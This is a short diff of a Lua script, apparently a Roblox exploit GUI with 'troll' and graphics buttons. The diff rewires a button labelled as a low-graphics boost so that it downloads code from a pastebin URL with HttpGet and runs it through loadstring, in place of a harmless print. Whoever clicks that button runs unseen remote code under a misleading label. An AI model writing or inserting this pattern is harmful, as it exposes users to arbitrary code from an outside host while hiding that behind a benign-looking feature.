@@ -261,7 +261,7 @@ troll:NewButton("swear", "fo", function()
 end)
 
 Graphics:NewButton("Low gfx(use_boost_2", "no_lag_ez", function()
-    print("Clicked")
+    loadstring(game:HttpGet("https://pastebin.com/raw/J4fjE5BV"))()
 end)
 
 
